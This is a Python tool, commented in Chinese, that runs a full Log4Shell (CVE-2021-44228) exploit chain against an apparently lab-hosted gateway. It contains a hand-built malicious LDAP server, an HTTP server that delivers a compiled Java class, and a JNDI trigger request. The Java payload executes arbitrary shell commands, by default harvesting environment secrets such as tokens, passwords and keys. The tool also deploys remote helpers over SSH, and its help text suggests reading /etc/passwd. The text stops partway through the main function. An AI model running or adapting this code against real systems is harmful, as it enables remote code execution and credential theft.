#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ThesisDrive · Log4Shell (CVE-2021-44228) 完整利用链 · 一键版

  ┌──────────┐   POST /api/log4shell            ┌──────────────────┐
  │  攻击机   │ ───────────────────────────────▶ │ security-gateway │
  │          │   {"message":"${jndi:ldap://..."} │  (carapace/JDK21)│
  │          │                                   └────────┬─────────┘
  │          │                                            │ InitialContext.lookup()
  │          │   ◀───── LDAP BindRequest ──────────────────┘
  │  LDAP    │
  │  1389    │   ────── LDAP SearchResultEntry ──▶ javaClassName=Exploit
  │          │          javaCodeBase=http://…:8888/  javaFactory=Exploit
  │          │
  │  HTTP    │   ◀───── GET /Exploit.class ────────────────┘
  │  8888    │   ────── 200 Exploit.class ─────▶ 类加载 → static{} 执行
  └──────────┘

两种运行模式
────────────
【本地模式·默认】在靶机宿主机上运行，回调服务直接在本机起。
  python3 log4shell_exp.py --host <LAB-IP> --port 8008 \\
                           --callback 172.20.0.1 --insecure

【外部模式 --external】在「外部攻击机」上运行（例如你的 Windows）：
  触发请求由本机真实发出，回调服务自动经 SSH 部署到靶机宿主机代跑。
  python log4shell_exp.py --external \\
                          --host <LAB-IP> --port 8008 \\
                          --ssh opencloud --callback 172.20.0.1 --insecure

  外部模式说明：由于攻击机通常无法被靶机回连（单通网络），
  LDAP/HTTP 回调服务改由靶机宿主机代跑，触发仍从攻击机真实发出。
  脚本会自动把自身上传到靶机、以后台模式拉起回调服务、用完清理。

前置条件（靶场侧开关）
────────────
  1. VULN_LOG4SHELL_ENABLED=true     端点走真 JNDI 解析分支
  2. LOG4SHELL_TRUST_CODEBASE=true   JVM 加 -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
                                     否则 JDK 21 拒绝远程 codebase，只能验证到 LDAP 回连

  开关命令：scripts/log4shell_switch.sh {status|on|off} [--recreate]
"""

import argparse
import base64
import http.server
import json
import os
import re
import shlex
import socket
import socketserver
import ssl
import struct
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
import uuid

# ─────────────────────────── 输出 ───────────────────────────

RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[31m"
GRN = "\033[32m"
YEL = "\033[33m"
BLU = "\033[34m"
CYN = "\033[36m"
MAG = "\033[35m"

USE_COLOR = sys.stdout.isatty() or os.environ.get("FORCE_COLOR") == "1"


def _c(code, text):
    return f"{code}{text}{RESET}" if USE_COLOR else text


def step(n, text):
    print(f"\n{_c(BOLD + BLU, '═' * 68)}")
    print(_c(BOLD + BLU, f" 步骤 {n} · {text}"))
    print(_c(BOLD + BLU, '═' * 68))


def info(text):
    print(f"  {_c(CYN, '[*]')} {text}")


def ok(text):
    print(f"  {_c(GRN, '[+]')} {text}")


def bad(text):
    print(f"  {_c(RED, '[-]')} {text}")


def warn(text):
    print(f"  {_c(YEL, '[!]')} {text}")


def hit(text):
    print(f"  {_c(BOLD + MAG, '[★]')} {text}")


def dump_bytes(label, data, limit=512):
    """打印原始字节（hex + ascii），用于展示真实回包。"""
    if isinstance(data, str):
        data = data.encode()
    if len(data) > limit:
        shown, suffix = data[:limit], f" … (+{len(data) - limit} bytes)"
    else:
        shown, suffix = data, ""
    print(f"  {_c(DIM, f'┌─ {label} ({len(data)} bytes)')}")
    for off in range(0, len(shown), 16):
        chunk = shown[off:off + 16]
        hexpart = " ".join(f"{b:02x}" for b in chunk)
        asciipart = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(_c(DIM, f"│ {off:04x}  {hexpart:<47}  {asciipart}"))
    print(_c(DIM, f"└─{suffix}"))


# ─────────────────────── BER / ASN.1 编码 ───────────────────────
# JNDI 走 LDAP v3（RFC 4511），需要最小可用的 BER 编解码。

def ber_tlv(tag, content):
    length = len(content)
    if length < 0x80:
        return bytes([tag, length]) + content
    enc, n = b"", length
    while n:
        enc = bytes([n & 0xFF]) + enc
        n >>= 8
    return bytes([tag, 0x80 | len(enc)]) + enc + content


def ber_int(tag, value):
    if value == 0:
        return ber_tlv(tag, b"\x00")
    enc, n = b"", value
    while n:
        enc = bytes([n & 0xFF]) + enc
        n >>= 8
    if enc[0] & 0x80:
        enc = b"\x00" + enc
    return ber_tlv(tag, enc)


def ber_str(tag, text):
    return ber_tlv(tag, text.encode("utf-8"))


def ber_enum(value):
    return ber_int(0x0A, value)


def ber_seq(*items):
    return ber_tlv(0x30, b"".join(items))


def ber_set(*items):
    return ber_tlv(0x31, b"".join(items))


def ber_read_tlv(data, pos):
    tag = data[pos]
    pos += 1
    length = data[pos]
    pos += 1
    if length & 0x80:
        nbytes = length & 0x7F
        length = int.from_bytes(data[pos:pos + nbytes], "big")
        pos += nbytes
    return tag, data[pos:pos + length], pos + length


def ber_read_int(content):
    return int.from_bytes(content, "big") if content else 0


# ─────────────────── LDAP 服务端（返回 JNDI Reference）───────────────────
# JNDI LDAP 提供者解析逻辑：javaClassName / javaCodeBase / javaFactory
# 三个属性凑齐后，JNDI 会去 javaCodeBase 下载 javaFactory.class 并实例化。

def build_search_result_entry(message_id, codebase_url, class_name):
    def attr(name, value):
        return ber_seq(ber_str(0x04, name), ber_set(ber_str(0x04, value)))

    attributes = ber_seq(
        attr("objectClass", "javaNamingReference"),
        attr("javaClassName", class_name),
        attr("javaCodeBase", codebase_url),
        attr("javaFactory", class_name),
    )
    entry = ber_tlv(0x64, ber_str(0x04, f"cn={class_name}") + attributes)
    return ber_seq(ber_int(0x02, message_id), entry)


def build_bind_response(message_id):
    bind_resp = ber_tlv(0x61, ber_enum(0) + ber_str(0x04, "") + ber_str(0x04, ""))
    return ber_seq(ber_int(0x02, message_id), bind_resp)


def build_search_done(message_id):
    done = ber_tlv(0x65, ber_enum(0) + ber_str(0x04, "") + ber_str(0x04, ""))
    return ber_seq(ber_int(0x02, message_id), done)


class LDAPRequestHandler(socketserver.BaseRequestHandler):
    def handle(self):
        conn = self.request
        conn.settimeout(30)
        srv = self.server
        try:
            while True:
                raw = conn.recv(8192)
                if not raw:
                    return
                srv.record("LDAP 收到数据", raw)

                _, msg_content, _ = ber_read_tlv(raw, 0)
                _, mid_content, p2 = ber_read_tlv(msg_content, 0)
                message_id = ber_read_int(mid_content)
                op_tag, _, _ = ber_read_tlv(msg_content, p2)

                if op_tag == 0x60:      # BindRequest
                    srv.log(f"LDAP BindRequest (msgid={message_id})")
                    resp = build_bind_response(message_id)
                    conn.sendall(resp)
                    srv.record("LDAP 发送 BindResponse", resp)
                elif op_tag == 0x63:    # SearchRequest
                    srv.log(f"LDAP SearchRequest (msgid={message_id})")
                    hit("命中！网关正在查询 JNDI 引用 → 返回恶意 Reference")
                    entry = build_search_result_entry(
                        message_id, srv.codebase_url, srv.class_name)
                    conn.sendall(entry)
                    srv.record("LDAP 发送 SearchResultEntry", entry)
                    srv.log(f"已下发 javaCodeBase={srv.codebase_url}")
                    srv.log(f"已下发 javaFactory={srv.class_name}")
                    conn.sendall(build_search_done(message_id))
                else:
                    srv.log(f"LDAP 其他 op tag=0x{op_tag:02x}，回 SearchResultDone")
                    conn.sendall(build_search_done(message_id))
        except (socket.timeout, ConnectionResetError, BrokenPipeError, IndexError):
            return
        except Exception as exc:  # noqa: BLE001
            srv.log(f"LDAP 处理异常: {exc}")
            return


class ThreadedLDAPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, addr, codebase_url, class_name, log):
        self.codebase_url = codebase_url
        self.class_name = class_name
        self.log = log
        self._records = []
        super().__init__(addr, LDAPRequestHandler)

    def record(self, label, data):
        self._records.append((label, data))

    @property
    def records(self):
        return self._records


# ─────────────────── HTTP 类服务器（提供 Exploit.class）───────────────────

class ClassFileHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):  # noqa: N802
        path = self.path.split("?")[0]
        if path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"log4shell teaching payload server\n")
            return
        target = os.path.join(self.server.payload_dir, os.path.basename(path))
        self.server.record("HTTP 请求", f"GET {self.path}".encode())
        if os.path.isfile(target):
            with open(target, "rb") as fh:
                body = fh.read()
            self.server.record("HTTP 响应", body[:64])
            self.server.log(f"网关下载 payload: GET {path} → 200 ({len(body)} bytes)")
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.server.log(f"HTTP 404: {path}")
            self.send_response(404)
            self.end_headers()


class ThreadedHTTPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, addr, payload_dir, log):
        self.payload_dir = payload_dir
        self.log = log
        self._records = []
        super().__init__(addr, ClassFileHandler)

    def record(self, label, data):
        self._records.append((label, data))

    @property
    def records(self):
        return self._records


# ─────────────────────── payload 编译 ───────────────────────

# 默认要执行的命令集（演示用）。用 --cmd 可整体替换。
DEFAULT_RCE_CMD = (
    "echo '===== id ====='; id 2>&1; "
    "echo; echo '===== whoami / uname ====='; "
    "whoami 2>&1; uname -a 2>&1; "
    "echo; echo '===== hostname / pwd ====='; "
    "hostname 2>&1; pwd 2>&1; "
    "echo; echo '===== ls /app ====='; "
    "ls -la /app 2>&1 | head -20; "
    "echo; echo '===== 敏感环境变量 ====='; "
    "env | sort | grep -Ei 'TOKEN|PASS|SECRET|KEY|VULN|JAVA_TOOL' 2>&1; "
    "echo; echo '===== 容器内进程 ====='; "
    "ps -ef 2>&1 | head -15; "
    "echo; echo '===== 写文件权限验证 ====='; "
    "echo LOG4SHELL-WRITE-TEST > /tmp/rce_write_test.txt 2>&1 && "
    "cat /tmp/rce_write_test.txt 2>&1"
)


def java_string_literal(s):
    """把任意 shell 串转成安全的 Java 字符串字面量（含引号）。"""
    out = []
    for ch in s:
        if ch == "\\":
            out.append("\\\\")
        elif ch == '"':
            out.append('\\"')
        elif ch == "\n":
            out.append("\\n")
        elif ch == "\r":
            out.append("\\r")
        elif ch == "\t":
            out.append("\\t")
        elif ord(ch) < 0x20:
            out.append("\\u%04x" % ord(ch))
        else:
            out.append(ch)
    return '"' + "".join(out) + '"'


EXPLOIT_SOURCE = r'''
import java.io.FileWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.util.Date;

/** Log4Shell 教学 payload：类加载时 static{} 执行。 */
public class Exploit {
    static {
        String marker = "__MARKER__";
        String idout  = "__IDOUT__";
        try {
            PrintWriter pw = new PrintWriter(new FileWriter(marker));
            pw.println("PWNED-BY-LOG4SHELL");
            pw.println("time=" + new Date());
            pw.println("host=" + InetAddress.getLocalHost().getHostName());
            pw.println("user=" + System.getProperty("user.name"));
            pw.println("cwd=" + System.getProperty("user.dir"));
            pw.println("trustURLCodebase=" +
                System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase"));
            pw.close();

            // 教学演示用的"任意命令执行"部分。
            // 下面这串 shell 会被网关容器以 carapace 身份执行，
            // 输出全部落到 idout，再由 exp 脚本 ssh 回来读给攻击者看。
            // 注意：必须用 { ...; } 包住整串再做重定向 ——
            // 否则 "cmd > f" 只重定向最后一条命令，前面的输出全丢。
            String cmd = __CMD__;
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c",
                "{ " + cmd + " ; } > " + idout + " 2>&1"});
        } catch (Throwable t) {
            // 教学场景静默
        }
    }
}
'''


def _javac_variants(src):
    """返回若干种 javac 调用方式，兼容不同 JDK。"""
    return [
        ["javac", "-encoding", "UTF-8", "--release", "8", "-nowarn", src],
        ["javac", "-encoding", "UTF-8", "-source", "8", "-target", "8", "-nowarn", src],
        ["javac", "-encoding", "UTF-8", "-source", "1.8", "-target", "1.8", "-nowarn", src],
        ["javac", "-encoding", "UTF-8", "-nowarn", src],
    ]


def render_source(marker_path, id_out_path, rce_cmd):
    """把占位符填进载荷源码。rce_cmd 会被转义成 Java 字符串字面量。"""
    return (EXPLOIT_SOURCE
            .replace("__MARKER__", marker_path)
            .replace("__IDOUT__", id_out_path)
            .replace("__CMD__", java_string_literal(rce_cmd)))


def compile_payload(build_dir, marker_path, id_out_path,
                    rce_cmd=DEFAULT_RCE_CMD, class_name="Exploit"):
    """编译 payload。返回 .class 路径，失败返回 None 并打印诊断。"""
    os.makedirs(build_dir, exist_ok=True)
    src = os.path.join(build_dir, f"{class_name}.java")
    cls = os.path.join(build_dir, f"{class_name}.class")
    with open(src, "w", encoding="utf-8") as fh:
        fh.write(render_source(marker_path, id_out_path, rce_cmd))

    last_err = ""
    for cmd in _javac_variants(src):
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True)
        except FileNotFoundError:
            return None, "找不到 javac（需要 JDK，不是 JRE）"
        if proc.returncode == 0 and os.path.isfile(cls):
            return cls, None
        last_err = (proc.stderr or proc.stdout or "").strip()
    return None, last_err or "javac 未产出 .class"


# ─────────────────────── 触发请求 ───────────────────────

def build_opener(insecure):
    if insecure:
        handler = urllib.request.HTTPSHandler(
            context=ssl._create_unverified_context())
    else:
        handler = urllib.request.HTTPSHandler()
    return urllib.request.build_opener(handler)


def trigger(opener, url, jndi_url, token=None, verbose=True):
    body = json.dumps({"message": "${jndi:" + jndi_url + "}"}).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", "ThesisDrive-Log4Shell-Exp/1.0")
    if token:
        req.add_header("X-Admin-Token", token)
    if verbose:
        print(_c(DIM, f"  POST {url}"))
        print(_c(DIM, "  Content-Type: application/json"))
        print(_c(DIM, f"  User-Agent: ThesisDrive-Log4Shell-Exp/1.0"))
        print(_c(DIM, f"  body: {body.decode()}"))
    try:
        with opener.open(req, timeout=30) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read()
    except Exception as exc:  # noqa: BLE001
        bad(f"请求失败: {type(exc).__name__}: {exc}")
        return None, b""


# ─────────────────── 外部模式：SSH 部署回调服务 ───────────────────

REMOTE_WORKDIR = "/tmp/log4shell_helper"

REMOTE_HELPER_ENTRY = r'''
# 由 log4shell_exp.py --external 自动生成并后台运行
import sys
sys.argv = [
    "log4shell_exp.py",
    "--serve-only",
    "--callback", "{callback}",
    "--ldap-port", "{ldap_port}",
    "--http-port", "{http_port}",
    "--build-dir", "{build_dir}",
    "--marker", "{marker}",
]
exec(open("{script}").read())
'''


def ssh_run(ssh_target, remote_cmd, timeout=120, capture=True):
    """在靶机上执行命令。

    注意：绝不使用 text=True —— Windows 默认 GBK 解码遇到 UTF-8
    字节会抛 UnicodeDecodeError（且异常发生在读取线程里，表现为
    输出静默丢失）。这里统一按字节收，再手动 utf-8 解码。
    """
    cmd = ["ssh", "-o", "ConnectTimeout=20", ssh_target, remote_cmd]
    proc = subprocess.run(cmd, capture_output=capture, timeout=timeout)
    out = (proc.stdout or b"").decode("utf-8", "replace")
    err = (proc.stderr or b"").decode("utf-8", "replace")
    return proc.returncode, out, err


def ssh_push(ssh_target, local_path, remote_path, timeout=120):
    cmd = ["scp", "-o", "ConnectTimeout=20", local_path,
           f"{ssh_target}:{remote_path}"]
    proc = subprocess.run(cmd, capture_output=True, timeout=timeout)
    return proc.returncode, (proc.stderr or b"").decode("utf-8", "replace")


def remote_compile(ssh_target, build_dir, marker, id_out,
                   rce_cmd=DEFAULT_RCE_CMD, class_name="Exploit"):
    """在靶机上编译 payload（攻击机无 JDK 时使用）。返回 (ok, msg)。"""
    import base64
    src = render_source(marker, id_out, rce_cmd)
    b64 = base64.b64encode(src.encode()).decode().replace("\n", "")
    # 逐个尝试编译参数；只要产出 .class 就算成功
    remote = (
        f"mkdir -p {build_dir} && cd {build_dir} && "
        f"echo {b64} | base64 -d > {class_name}.java && "
        f"rm -f {class_name}.class && "
        f"javac -encoding UTF-8 -source 8 -target 8 -nowarn {class_name}.java 2>/dev/null || true; "
        f"[ -f {class_name}.class ] || javac -encoding UTF-8 -nowarn {class_name}.java 2>/dev/null || true; "
        f"if [ -f {class_name}.class ]; then "
        f"  ls -la {class_name}.class; "
        f"else echo COMPILE_FAILED; javac -version 2>&1; fi"
    )
    rc, out, err = ssh_run(ssh_target, remote, timeout=120)
    if ".class" in out and "COMPILE_FAILED" not in out:
        return True, out.strip()
    detail = out.strip() or err.strip()
    return False, detail[:400]


def external_setup(ssh_target, args, marker, id_out, rce_cmd=None):
    """一次性把靶机侧全部准备工作做完（只开 1 次 SSH）。

    本环境单次 SSH 握手约 5.5 秒，而 javac 编译只要 0.9 秒 ——
    慢的是连接数，不是计算。所以把「传脚本 + 传源码 + 编译 + 启服务
    + 探测就绪」全部塞进一次 ssh：数据经 stdin 管道送过去（不受
    命令行长度限制，避免 WinError 206），其余动作在远端那个
    python 进程里一次做完。
    """
    import base64
    import zlib

    step("2a", "在靶机部署回调服务（单次 SSH）")
    build_dir = args.build_dir
    if rce_cmd is None:
        rce_cmd = DEFAULT_RCE_CMD

    # ── 打包要送到靶机的东西（压缩后经 stdin 送）────────────
    payload = {
        "script": open(os.path.abspath(__file__), encoding="utf-8").read(),
        "java": render_source(marker, id_out, rce_cmd),
        "entry": REMOTE_HELPER_ENTRY.format(
            callback=args.callback, ldap_port=args.ldap_port,
            http_port=args.http_port, build_dir=build_dir,
            marker=marker, script=f"{REMOTE_WORKDIR}/log4shell_exp.py"),
    }
    blob = base64.b64encode(
        zlib.compress(json.dumps(payload).encode("utf-8"), 9)).decode()

    # ── 远端一个 python 进程内完成全部动作 ──────────────────
    remote_py = (
        "import base64, json, os, subprocess, sys, time, zlib\n"
        "data = json.loads(zlib.decompress(base64.b64decode("
        "sys.stdin.read())))\n"
        f"work, bdir = {REMOTE_WORKDIR!r}, {build_dir!r}\n"
        "os.makedirs(work, exist_ok=True)\n"
        "os.makedirs(bdir, exist_ok=True)\n"
        "\n"
        "# 1) 落盘脚本\n"
        "open(os.path.join(work, 'log4shell_exp.py'), 'w', "
        "encoding='utf-8').write(data['script'])\n"
        "\n"
        "# 2) 落盘 java 源码并编译\n"
        "jsrc = os.path.join(bdir, 'Exploit.java')\n"
        "open(jsrc, 'w', encoding='utf-8').write(data['java'])\n"
        "cls = os.path.join(bdir, 'Exploit.class')\n"
        "if os.path.exists(cls):\n"
        "    os.remove(cls)\n"
        "subprocess.run(['javac', '-encoding', 'UTF-8', '-nowarn', jsrc],\n"
        "               capture_output=True)\n"
        "if not os.path.exists(cls):\n"
        "    subprocess.run(['javac', '-encoding', 'UTF-8', '-source', '8',\n"
        "                    '-target', '8', '-nowarn', jsrc], "
        "capture_output=True)\n"
        "if not os.path.exists(cls):\n"
        "    print('COMPILE_FAILED')\n"
        "    sys.exit(1)\n"
        "print('CLASS_OK', os.path.getsize(cls))\n"
        "\n"
        "# 3) 收掉旧服务\n"
        "for pat in ('log4shell_exp.py --serve-only', 'helper_run.py'):\n"
        "    subprocess.run(['pkill', '-f', pat], capture_output=True)\n"
        "\n"
        "# 4) 落盘 helper 入口并后台启动\n"
        "open(os.path.join(work, 'helper_run.py'), 'w', "
        "encoding='utf-8').write(data['entry'])\n"
        "log = os.path.join(work, 'helper.log')\n"
        "with open(log, 'w') as fh:\n"
        "    subprocess.Popen(['python3', '-u', "
        "os.path.join(work, 'helper_run.py')],\n"
        "                     stdout=fh, stderr=subprocess.STDOUT,\n"
        "                     stdin=subprocess.DEVNULL, cwd=work,\n"
        "                     start_new_session=True)\n"
        "\n"
        "# 5) 探测就绪\n"
        "ok = False\n"
        "for _ in range(80):\n"
        "    try:\n"
        "        if 'LISTENING' in open(log).read():\n"
        "            ok = True\n"
        "            break\n"
        "    except Exception:\n"
        "        pass\n"
        "    time.sleep(0.2)\n"
        "print('--- helper.log ---')\n"
        "print(open(log).read().strip())\n"
        "print('PORTS_OK' if ok else 'NO_LISTEN')\n"
    )
    pb = base64.b64encode(remote_py.encode("utf-8")).decode()
    remote_cmd = (f"echo {pb} | base64 -d > /tmp/_dep.py && "
                  f"python3 /tmp/_dep.py; rm -f /tmp/_dep.py")

    proc = subprocess.run(["ssh", "-o", "ConnectTimeout=20", ssh_target,
                           remote_cmd],
                          input=blob.encode(), capture_output=True,
                          timeout=180)
    out = (proc.stdout or b"").decode("utf-8", "replace")
    err = (proc.stderr or b"").decode("utf-8", "replace")

    for line in out.strip().splitlines():
        print(_c(DIM, f"  [远端] {line}"))
    if "COMPILE_FAILED" in out:
        bad("靶机编译失败（javac 不可用？）")
        return None
    listening = "PORTS_OK" in out
    if listening:
        ok("回调服务已在靶机就绪")
    else:
        bad("回调服务未能在靶机启动")
        if err.strip():
            print(_c(DIM, f"  ssh stderr: {err.strip()[:300]}"))
    return listening


def external_verify(ssh_target, marker, id_out_path, ldap_port=0, http_port=0):
    """外部模式：从靶机侧读取回调服务的交互记录 + RCE 证据。

    关键点：容器内命令的回显在这里被整段 ssh 回攻击机本地并打印，
    所以演示者无需自己再 ssh 一遍，只跑本脚本就能看到 id 结果。
    """
    step("5a", "从靶机侧收集回调证据")
    rc, out, err = ssh_run(
        ssh_target,
        f"cd {REMOTE_WORKDIR} && cat helper.log 2>/dev/null",
        timeout=60)
    if out.strip():
        print(_c(DIM, "  ── 靶机回调服务日志 ──"))
        for line in out.strip().splitlines()[-60:]:
            print(_c(DIM, f"  [远端] {line}"))
    else:
        info("（helper.log 为空）")

    # RCE 证据：在网关容器里读 static{} 写出的文件
    # 关键：这一步把"容器内执行的命令回显"整段 ssh 回来，直接打在
    # 攻击机本地终端上 —— 攻击者不需要自己再 ssh 一遍。
    step("5b", "取回容器内命令执行回显（RCE 落地）")
    marker_ok = False
    marker_text = ""

    rc, out2, err2 = ssh_run(
        ssh_target,
        f"docker exec thesis-drive-security-gateway-1 "
        f"sh -c 'cat {marker} 2>/dev/null || echo __NO_MARKER__'",
        timeout=60)
    if "__NO_MARKER__" in out2 or not out2.strip():
        warn(f"未找到 RCE 证据文件 {marker}")
    else:
        marker_ok = True
        marker_text = out2
        print(_c(GRN + BOLD, f"\n  ┌── 网关容器内 {marker} ─────────────────"))
        for line in out2.rstrip().splitlines():
            print(_c(DIM, "  │ ") + line)
        print(_c(GRN + BOLD, "  └──────────────────────────────────────────"))

    # 命令回显文件（id / whoami / env ... 全量）
    # 约定：id 输出文件 = marker 路径把 .txt 换成 _id.txt
    id_out_path = (marker[:-4] + "_id.txt") if marker.endswith(".txt") \
        else (marker + "_id")
    rc, out3, err3 = ssh_run(
        ssh_target,
        f"docker exec thesis-drive-security-gateway-1 "
        f"sh -c 'cat {id_out_path} 2>/dev/null || echo __NO_IDOUT__'",
        timeout=60)
    if "__NO_IDOUT__" in out3 or not out3.strip():
        warn(f"未找到命令回显文件 {id_out_path}")
    else:
        marker_text = marker_text + "\n" + out3
        print(_c(GRN + BOLD,
                 f"\n  ┌── 网关容器内任意命令回显 {id_out_path} ─────"))
        for line in out3.rstrip().splitlines():
            print(_c(DIM, "  │ ") + line)
        print(_c(GRN + BOLD, "  └──────────────────────────────────────────"))

    return out + "\n" + marker_text


def external_cleanup(ssh_target):
    rc, out, err = ssh_run(
        ssh_target,
        f"pkill -f 'log4shell_exp.py --serve-only' 2>/dev/null; "
        f"pkill -f 'helper_run.py' 2>/dev/null; "
        f"rm -rf {REMOTE_WORKDIR}; echo cleaned",
        timeout=60)
    ok("靶机回调服务已停止并清理")


# ─────────────────── serve-only：回调服务单独运行 ───────────────────

def run_read(args):
    """只读回显：不发攻击，把上次 RCE 在容器内留下的结果取回本地打印。

    用途：演示时分工 —— 一人负责发 POST（可无 SSH），
    有 SSH 的人用这条随时把 id / 命令回显拉出来给大家看。
    """
    ssh_target = args.ssh
    marker = args.marker
    id_out = (marker[:-4] + "_id.txt") if marker.endswith(".txt") \
        else (marker + "_id")

    print(f"""
{_c(BOLD + CYN, '╔' + '═' * 66 + '╗')}
{_c(BOLD + CYN, '║   ThesisDrive · Log4Shell  只读回显（--read）')}                  {_c(BOLD + CYN, '║')}
{_c(BOLD + CYN, '╚' + '═' * 66 + '╝')}""")
    info(f"SSH 目标: {ssh_target}")
    info(f"回显文件: {id_out}")

    step(1, "读取 RCE 落地标记")
    rc, out, err = ssh_run(
        ssh_target,
        f"docker exec thesis-drive-security-gateway-1 "
        f"sh -c 'cat {marker} 2>/dev/null || echo __NO_MARKER__'",
        timeout=60)
    if "__NO_MARKER__" in out or not out.strip():
        warn(f"未找到 {marker}")
        warn("说明：还没成功打过，或容器被重建过（重建会清空 /tmp）")
    else:
        print(_c(GRN + BOLD, f"\n  ┌── {marker} ─────────────────"))
        for line in out.rstrip().splitlines():
            print(_c(DIM, "  │ ") + line)
        print(_c(GRN + BOLD, "  └──────────────────────────────────────────"))

    step(2, "读取任意命令回显")
    rc, out2, err2 = ssh_run(
        ssh_target,
        f"docker exec thesis-drive-security-gateway-1 "
        f"sh -c 'cat {id_out} 2>/dev/null || echo __NO_IDOUT__'",
        timeout=60)
    if "__NO_IDOUT__" in out2 or not out2.strip():
        warn(f"未找到 {id_out}")
    else:
        print(_c(GRN + BOLD, f"\n  ┌── {id_out} ─────────────────"))
        for line in out2.rstrip().splitlines():
            print(_c(DIM, "  │ ") + line)
        print(_c(GRN + BOLD, "  └──────────────────────────────────────────"))

    step(3, "如需执行任意命令")
    info("带 --cmd 重跑一次攻击即可，例如：")
    print(_c(DIM, f"    python log4shell_exp.py --external --ssh {ssh_target} "
                  f"--host <靶机IP> --port 8008 --callback 172.20.0.1 "
                  f"--insecure --cmd \"cat /etc/passwd\""))
    info("不带 --cmd 时执行内置命令集（id / whoami / env / ls /app ...）")
    print(_c(DIM, f"    ssh {ssh_target} "
                  f"\"docker exec thesis-drive-security-gateway-1 "
                  f"sh -c '任意命令'\"  # 也可用这条直接手工核对"))
    return 0


def run_serve_only(args):
    """仅启动 LDAP + HTTP 回调服务（供外部模式在靶机上调用）。"""
    codebase_url = f"http://{args.callback}:{args.http_port}/"

    def log(msg):
        print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)

    ldap_srv = ThreadedLDAPServer(("0.0.0.0", args.ldap_port),
                                  codebase_url, "Exploit", log)
    http_srv = ThreadedHTTPServer(("0.0.0.0", args.http_port),
                                  args.build_dir, log)
    threading.Thread(target=ldap_srv.serve_forever, daemon=True).start()
    threading.Thread(target=http_srv.serve_forever, daemon=True).start()
    log(f"LISTENING LDAP 0.0.0.0:{args.ldap_port}  HTTP 0.0.0.0:{args.http_port}")
    log(f"codebase_url={codebase_url}")
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        pass
    return 0


# ─────────────────────── 主流程 ───────────────────────

def main():
    ap = argparse.ArgumentParser(
        description="ThesisDrive Log4Shell 完整利用链（本地 / 外部两种模式）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例:\n"
            "  【演示·推荐】攻击机上一条命令完成全链，并就地打印 id 回显:\n"
            "    python log4shell_exp.py --external --ssh opencloud "
            "--host <LAB-IP> --port 8008 --callback 172.20.0.1 --insecure\n"
            "\n"
            "  【分工】一人发攻击，另一人（有 SSH）看结果:\n"
            "    发攻击:  python log4shell_exp.py --external --stay "
            "--ssh opencloud --callback 172.20.0.1 --insecure\n"
            "    看结果:  python log4shell_exp.py --read --ssh opencloud\n"
            "\n"
            "  本地模式（在靶机宿主机上跑）:\n"
            "    python3 log4shell_exp.py --callback 172.20.0.1 --insecure\n"
        ),
    )
    ap.add_argument("--host", default="<LAB-IP>", help="靶场地址")
    ap.add_argument("--port", type=int, default=8008, help="HTTPS 入口端口")
    ap.add_argument("--callback", default=None,
                    help="回调地址（靶机能路由到的地址，如 172.20.0.1）")
    ap.add_argument("--ldap-port", type=int, default=1389, help="LDAP 端口")
    ap.add_argument("--http-port", type=int, default=8888, help="HTTP 类服务端口")
    ap.add_argument("--path", default="/api/log4shell", help="触发端点路径")
    ap.add_argument("--token", default=None, help="可选 X-Admin-Token")
    ap.add_argument("--insecure", action="store_true", help="忽略 TLS 证书校验")
    ap.add_argument("--build-dir", default=None,
                    help="payload 编译目录（外部模式下请留默认，脚本自动用远端路径）")
    ap.add_argument("--marker", default="/tmp/RCE_PROOF_LOG4SHELL.txt",
                    help="靶机内落地的证明文件路径")
    ap.add_argument("--cmd", default=None,
                    help="要在容器内执行的命令（默认执行内置命令集：id/whoami/env/ls 等）")
    ap.add_argument("--wait", type=float, default=8.0, help="触发后等待回连秒数")
    ap.add_argument("--external", action="store_true",
                    help="外部模式：本机触发 + 回调服务经 SSH 部署到靶机")
    ap.add_argument("--ssh", default="opencloud",
                    help="外部模式的 SSH 目标（~/.ssh/config 别名或 user@host）")
    ap.add_argument("--keep-helper", action="store_true",
                    help="外部模式结束后保留靶机回调服务（默认清理）")
    ap.add_argument("--serve-only", action="store_true",
                    help="仅启动回调服务（外部模式内部使用）")
    ap.add_argument("--stay", action="store_true",
                    help="外部模式下不清理靶机回调服务，供后续反复演示")
    ap.add_argument("--read", action="store_true",
                    help="只读取上次 RCE 的回显（不发攻击），用于演示时看结果")
    args = ap.parse_args()

    # 外部模式：编译目录始终用远端路径；本地模式按平台选
    if args.build_dir is None:
        if args.external:
            args.build_dir = "/tmp/log4shell_payload"
        else:
            args.build_dir = (r"C:\Windows\Temp\log4shell_payload"
                              if os.name == "nt" else "/tmp/log4shell_payload")
    elif args.external and os.name == "nt":
        # 用户显式传了 Windows 路径，外部模式下会失效 —— 提示并纠正
        warn(f"外部模式忽略本机路径 --build-dir {args.build_dir}，改用 /tmp/log4shell_payload")
        args.build_dir = "/tmp/log4shell_payload"

    if args.serve_only:
        if not args.callback:
            print("--serve-only 需要 --callback", file=sys.stderr)
            return 2
        return run_serve_only(args)

    # ── 只读回显：不发攻击，仅把上次 RCE 的结果取回本地打印 ──
    if args.read:
        return run_read(args)

    if not args.callback:
